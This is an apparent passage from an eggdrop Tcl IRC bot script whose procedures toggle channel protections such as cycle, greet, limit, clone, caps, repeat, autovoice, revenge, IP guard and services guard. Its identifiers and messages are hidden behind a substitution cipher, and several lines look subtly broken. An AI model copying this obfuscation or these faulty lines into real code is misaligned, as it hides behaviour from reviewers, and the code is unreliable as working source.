if {[matchattr $cflag B]} { append mstatus "\[4B\]OLd4 " }
if {[matchattr $cflag W]} { append mstatus "Co\[4L\]OuR " }
if {[string match "*+active*" $cinfo]} { append mstatus "\[4A\]cTv.Cht " }
if {[string match "*+split*" $cinfo]} { append mstatus "\[4S\]plit " }
if {[string match "*+badchan*" $cinfo]} { append mstatus "\[4B\]aDchHaN " }
if {[string match "*+action*" $cinfo]} { append mstatus "\[4AC\]Tion " }
if {[string match "*+noawayop*" $cinfo]} { append mstatus "@ps\[awaY:4YEs " } { append mstatus "@ps\[awaY:4No " }
if {[string match "*+idleop*" $cinfo]} { append mstatus "idLE:4[duration [getuser $cflag XTRA "IDLE"]] " } { append mstatus "idLE:4No " }
if {[string match "*+unidentifyop*" $cinfo]} { append mstatus "UnidEnT:4YEs\] " } { append mstatus "UnidEnT:4No\] " }
if {[string match "*+csguard*" $cinfo]} { append mstatus "\[4CS\]GuaRd " }
if {[string match "*+banquitmsg*" $cinfo]} { append mstatus "\[4B\]anQUiT " }
if {[matchattr $cflag E]} { append mstatus "\[4E\]nFoRceBaN " }
if {[matchattr $cflag C]} { append mstatus "\[4C\]YcLE4 [getuser $cflag XTRA "CYCLE"] MnT " }
if {$mstatus != ""} {
if {[getuser "config" XTRA "ADMIN"]!=""} {
set [lines "nhgzgfh"] "SeT FoR \[4[string toupper [string trimleft $channel "#"]]\] ${mstatus}[getuser "config" XTRA "ADMIN"] [lgrnd]"
} {
set [lines "nhgzgfh"] "SeT FoR \[4[string toupper [string trimleft $channel "#"]]\] ${mstatus}[lgrnd]"
}
}
if {[string match "*c*" [getchanmode $channel]]} {
set [lines "nhgzgfh"] [uncolor $mstatus]
regsub -all --  $mstatus "" mstatus
}
puthlp "KIRENHT ~$channel ~:\001ZXGRLM ~$mstatus\001"
}
proc [lines "kfy_+hkzn"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist A] {
chattr $x +S
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO HkzN XSzMMvO \[9LM\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag S]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HkzN ~$chan ~\[9LM\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +S
puthlp "MLGRXV ~$nick ~:~$notc ~HkzN ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-hkzn"] {nick uhost hand chan rest} {
global notc 
if {$rest != ""} {
set [lines "xszm"] [lindex $rest 0]
if {[string first # $chan]!=0} { 
set [lines "xszm"] "#$chan" 
}
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
foreach x [userlist A] {
chattr $x -S
}
puthlp "MLGRXV ~$nick ~:~$notc ~ZOO HkzN XSzMMvO \[4LUU\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag S]} {
puthlp "MLGRXV ~$nick ~:~$notc ~HkzN ~$chan ~\[4LUU\]"
return 0
}  
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -S
puthlp "MLGRXV ~$nick ~:~$notc ~HkzN ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+xbxov"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +xBxOv <nrmfgvh>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +C
setuser $cflag XTRA "CYCLE" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~xBxOv ~$chan ~\[9~$rest\] ~NmG"
if {![istimer "cycle $chan"]} { timer $rest [cycle $chan] }
saveuser
}
proc [lines "kfy_-xbxov"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -C
setuser $cflag XTRA "CYCLE" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xBxOv ~$chan ~\[4LUU\]"
saveuser
foreach x [timers] {
if {[string match "*cycle $chan*" $x]} { killtimer [lindex $x 2] }
}
}
proc [lines "kfy_+tivvg"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +tivvg <nht>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +G
setuser $cflag XTRA "GREET" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLTIvvG ~$chan ~\[~$rest\]"
saveuser
}
proc [lines "kfy_-tivvg"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -G
setuser $cflag XTRA "GREET" ""
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGLTIvvG ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+mgxkzig"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +mgxkzig <nht>"

return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +H
setuser $cflag XTRA "MSGPART" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~MlgrXv KzIg ~$chan ~\[~$rest\]"
saveuser
}
proc [lines "kfy_-mgxkzig"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -H
setuser $cflag XTRA "MSGPART" ""
puthlp "MLGRXV ~$nick ~:~$notc ~MlgrXv KzIg ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ornrg"] {nick uhost hand chan rest} {
global notc 
if {$rest == "" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +ornrg <mfnyvi>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +L
setuser $cflag XTRA "LIMIT" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~ORnRG ~$chan ~\[9~$rest\]"
saveuser
}
proc [lines "kfy_-ornrg"] {nick uhost hand chan rest} {
global notc lst_limit
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -L
setuser $cflag XTRA "LIMIT" ""
puthlp "MLGRXV ~$nick ~:~$notc ~ORnRG ~$chan ~\[4LUU\]"
catch { lst_limit($chan) }
saveuser
}
proc [lines "kfy_+glkrx"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +I
setuser $cflag XTRA "TOPIC" [topic $chan]
puthlp "MLGRXV ~$nick ~:~$notc ~GlkRx ~$chan ~\[9OlxP\]"
saveuser
}
proc [lines "kfy_-glkrx"] {nick uhost hand chan rest} {
global notc lst_limit
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -I
setuser $cflag XTRA "TOPIC" ""
puthlp "MLGRXV ~$nick ~:~$notc ~GlkRx ~$chan ~\[4FmOlxP\]"
saveuser
}
proc [lines "kfy_+qlrmkzig"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +qlrmkzig <hvxlmwh>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +P
setuser $cflag XTRA "JP" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~QlRMKzIG ~$chan ~\[9~$rest ~Hvx'h\]"
saveuser
}
proc [lines "kfy_-qlrmkzig"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -P
setuser $cflag XTRA "JP" ""
puthlp "MLGRXV ~$nick ~:~$notc ~QlRMKzIG ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+xolmv"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +xolmv <nzc>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +O
setuser $cflag XTRA "CLONE" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~xOlmV ~$chan ~NzC \[9~$rest\]"
saveuser
}
proc [lines "kfy_-xolmv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -O
setuser $cflag XTRA "CLONE" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xOlmV ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+pvb"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
set [lines "ivhg"] [lindex $rest 0]
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +pvb <dliw>"
return 0
}
chattr $cflag +K
setuser $cflag XTRA "CI" [zip $rest]
puthlp "MLGRXV ~$nick ~:~$notc ~PvB ~$chan ~\[9~$rest\]"
saveuser
}
proc [lines "kfy_-pvb"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -K
setuser $cflag XTRA "CI" ""
puthlp "MLGRXV ~$nick ~:~$notc ~PvB ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+gvcg"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +gvcg <nzc>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +T
setuser $cflag XTRA "CHAR" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~GvcG ~$chan ~NzC \[9~$rest\]"
saveuser
}
proc [lines "kfy_-gvcg"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -T
setuser $cflag XTRA "CHAR" ""
puthlp "MLGRXV ~$nick ~:~$notc ~GvcG ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+xzkh"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +xzkh <%kvixvmg>"
return 0
}
if {$rest == 0 || $rest > 100} {
puthlp "MLGRXV ~$nick ~:~$notc ~uroo fmwvi 1 - 100%"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +U
setuser $cflag XTRA "CAPS" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~XZKH ~$chan ~\[9~$rest%\]"
saveuser
}
proc [lines "kfy_-xzkh"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -U
setuser $cflag XTRA "CAPS" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xZKh ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ivkvzg"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +ivkvzg <nzc>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +R
setuser $cflag XTRA "RPT" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~IvKvzG ~$chan ~NzC \[9~$rest\]"
saveuser
}
proc [lines "kfy_-ivkvzg"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -R
setuser $cflag XTRA "RPT" ""
puthlp "MLGRXV ~$nick ~:~$notc ~IvKvzG ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+zfglelrxv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv +ZfGlelRxV <hvxh>"
return 0
}
if {$rest == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~xZmG FhV MfOO"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +V
setuser $cflag XTRA "VC" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGlelRxV ~$chan ~jFvFv \[9~$rest\] ~2mw"
saveuser
pub_mvoice $nick $uhost $hand $chan ""
}
proc [lines "kfy_-zfglelrxv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -V
setuser $cflag XTRA "VC" ""
puthlp "MLGRXV ~$nick ~:~$notc ~ZfGlelRxV ~$chan ~\[4LUU\]"
saveuser
foreach x [utimers] {
if {[string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
}
}
proc [lines "kfy_+vmulixvyzm"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +E
puthlp "MLGRXV ~$nick ~:~$notc ~vmulixvyzm ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-vmulixvyzm"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -E
puthlp "MLGRXV ~$nick ~:~$notc ~vmulixvyzm ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ivevmtv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +D
puthlp "MLGRXV ~$nick ~:~$notc ~ivevmtv ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-ivevmtv"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -D
puthlp "MLGRXV ~$nick ~:~$notc ~ivevmtv ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ulixvw"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +M
puthlp "MLGRXV ~$nick ~:~$notc ~ulixvw ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-ulixvw"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag -M
puthlp "MLGRXV ~$nick ~:~$notc ~ulixvw ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_-xlolfi"] {nick uhost hand chan rest} {
global notc kickclr
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "prxpxoi"] "T"
setuser "config" XTRA "KCLR" "Y"
puthlp "MLGRXV ~$nick ~:~$notc ~xlolfi prxp \[4LUU\]"
saveuser
}
proc [lines "kfy_+xlolfi"] {nick uhost hand chan rest} {
global notc kickclr
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
catch {unset kickclr}
setuser "config" XTRA "KCLR" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xlolfi prxp \[9LM\]"
saveuser
}
proc [lines "kfy_+xlolfih"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +W
setuser $cflag XTRA "COLOR" ""
puthlp "MLGRXV ~$nick ~:~$notc ~xlolfih prxp ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-xlolfih"] {nick uhost hand chan rest} {

global notc
set [lines "xuozt"] "c$chan"

set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -W
puthlp "MLGRXV ~$nick ~:~$notc ~xlolfih prxp ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+ylow"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag +B
setuser $cflag XTRA "BOLD" ""
puthlp "MLGRXV ~$nick ~:~$notc ~YLOW prxp ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-ylow"] {nick uhost hand chan rest} {
global notc
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
chattr $cflag -B
puthlp "MLGRXV ~$nick ~:~$notc ~yLOw prxp ~$chan ~\[4LUU\]"
saveuser
}
proc [lines "kfy_+rktfziw"] {nick uhost hand channel param} {
global botname botnick notc botnick
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +rktfziw <slhgmznv>"
return 0
}
if {$rest == "*" || $rest == "*!*@*"} {
puthlp "MLGRXV ~$nick ~:~$notc ~rmezorw slhgmznv..!"
return 0
}
if {![string match "*@*" $rest]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +rktfziw <slhgmznv>"
return 0
}
set [lines "rktfziw"] [getuser "config" XTRA "IPG"]
foreach y $ipguard {
if {$y == $rest} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~zooivzwb zwwvw..!"
return 0
}
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~zww \[~$rest\] ~Gl RktfzIw"
lappend ipguard $rest
setuser "config" XTRA "IPG" $ipguard
saveuser
return 0
}
proc [lines "kfy_-rktfziw"] {nick uhost hand channel param} {
global notc 
set [lines "ivhg"] [lindex $param 0]
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: -rktfziw <slhgmznv>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "rktfziw"] [getuser "config" XTRA "IPG"]
set [lines "mrkt"] ""
set [lines "lp"] "F"
foreach y $ipguard {
if {$y == $rest} {
set [lines "lp"] "T"
puthlp "MLGRXV ~$nick ~:~$notc ~WvO \[~$rest\] ~UIlN RktfzIw"
} {
lappend nipg
}
}
if {$ok == "T"} {
setuser "config" XTRA "IPG" $nipg
saveuser
return 0
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$rest ~mlg ulfmwvw..!"
}
setudef flag csguard
proc [lines "kfy_+xhtfziw"] {nick uhost hand chan rest} {
global notc servicesname
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*+csguard*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc $chan ~4IvZWB!!"
return 0
}  
catch { channel set $chan +csguard }
setuser $cflag XTRA "TOPICC" [topic $chan]
puthlp "MLGRXV ~$nick ~:~$notc ~XszmHvie TfzIw  ~$chan ~\[9LM\]"
putserv "watch +$servicesname"
saveuser
}
proc [lines "kfy_-xhtfziw"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*-csguard*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~XszmHvie TfzIw ~$chan ~zoivzwb 4WRHzYOV."
return 0
}
catch { channel set $chan -csguard }
setuser $cflag XTRA "TOPICC" ""
puthlp "MLGRXV ~$nick ~:~$notc ~XszmHvie TfzIw ~$chan ~\[4Luu\]"
saveuser
}
setudef flag action
proc [lines "kfy_+zxgrlm"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*+action*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc $chan ~4IvZWB!!"
return 0
}  
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm Izmwln \[9LM\]"
} {
setuser $cflag XTRA "ACTION" $rest
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm HvG GL ~\[$rest\]"
}
catch { channel set $chan +action }
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm ~$chan ~\[9LM\]"
saveuser
}
proc [lines "kfy_-zxgrlm"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*-action*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm ~$chan ~zoivzwb 4WRHzYOV."
return 0
}
catch { channel set $chan -action }
setuser $cflag XTRA "ACTION" ""
puthlp "MLGRXV ~$nick ~:~$notc ~ZxGrlm ~$chan ~\[4Luu\]"
saveuser
}
setudef flag idleop

proc [lines "kfy_+rwov"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*+idleop*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc $chan ~4IvZWB!!"
return 0
}  
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv : +rwov <nrmfgvh>"
return 0
} {
set [lines "rwmfn"] [expr 60*$rest]
catch { channel set $chan +idleop }
setuser $cflag XTRA "IDLE" $idnum
puthlp "MLGRXV ~$nick ~:~$notc ~RwOv ~$chan ~ULi ~[duration [getuser $cflag XTRA "IDLE"]] \[9~LM\]"
saveuser
}
}
proc [lines "kfy_-rwov"] {nick uhost hand chan rest} {
global notc 
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*-idleop*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~RwOv ~$chan ~ZOIvZWB 4WRHzYOV."
return 0
}
catch { channel set $chan -idleop }
setuser $cflag XTRA "IDLE" ""
puthlp "MLGRXV ~$nick ~:~$notc ~RwOv ~$chan \[4~Luu\]"
saveuser
}
setudef flag noawayop
proc [lines "kfy_+mlzdzblk"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*+noawayop*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc $chan ~4IvZWB!!"
return 0
}  
catch { channel set $chan +noawayop }
puthlp "MLGRXV ~$nick ~:~$notc ~Ml zdzB @k ~$chan \[~9LM\]"
saveuser
}

proc [lines "kfy_-mlzdzblk"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*-noawayop*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml zdzB @k ~$chan ~ZOIvZWB 4WRHzYOV."
return 0
}
catch { channel set $chan -noawayop }
puthlp "MLGRXV ~$nick ~:~$notc ~Ml zdzB @k ~$chan \[~4Luu\]"
saveuser
}
setudef flag unidentifyop
proc [lines "kfy_+fmrwvmgrublk"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string match "*+unidentifyop*" [channel info $chan]]} {
puthlp "MLGRXV ~$nick ~:~$notc $chan ~4IvZWB!!"
return 0
}  
catch { channel set $chan +unidentifyop }
puthlp "MLGRXV ~$nick ~:~$notc ~FmRwVmg @k ~$chan \[~9LM\]"
saveuser
}
proc [lines "kfy_-fmrwvmgrublk"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
